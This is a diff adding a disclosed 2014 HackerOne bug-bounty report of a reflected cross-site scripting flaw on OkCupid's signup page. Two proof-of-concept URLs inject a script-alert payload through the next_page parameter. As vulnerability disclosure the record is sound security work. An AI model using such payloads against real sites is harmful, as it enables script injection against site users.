@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/5427
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/jeet22
+ReportedTo:OkCupid(okcupid)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:08.07.2014 10:00:34
+
+Summary:
+
+Xss high issue in  www.okcupid.com main domain in users signup page
+
+Poc url : you can use any url below for reproduce xss issue 
+
+https://www.okcupid.com/signup?next_page=%2Fsignup%2Fpaths%2Fsplash_new_inga%2F3.html4ee57<script>alert("xss by jeet")</script>38be67268f1710978&status=1&opento=1&experiment_name=new+signup&gender=1&orientation=1&screenname=&birthmonth=1&birthday=1&birthyear=1996&country=India&zip_or_city=Kota&locid=685463&lquery=kota&email=jeet%40gmail.com&email2=jeet%40gmail.com
+
+
+https://www.okcupid.com/signup?next_page=%2Fsignup%2Fpaths%2Fsplash_new_inga%2F3.html4ee57<script>alert(1)</script>38be67268f1710978&status=1&opento=1&experiment_name=new+signup&gender=1&orientation=1&screenname=&birthmonth=1&birthday=1&birthyear=1996&country=India&zip_or_city=Kota&locid=685463&lquery=kota&email=jeet%40gmail.com&email2=jeet%40gmail.com
+
+Vulnrable parameter : next_page = xss payload
+
+xss screen shots in attachments 
+
+thanks.... happy hunting 
+
+by : Jitendra jaiswal (twitter/jeetjaiswal22)
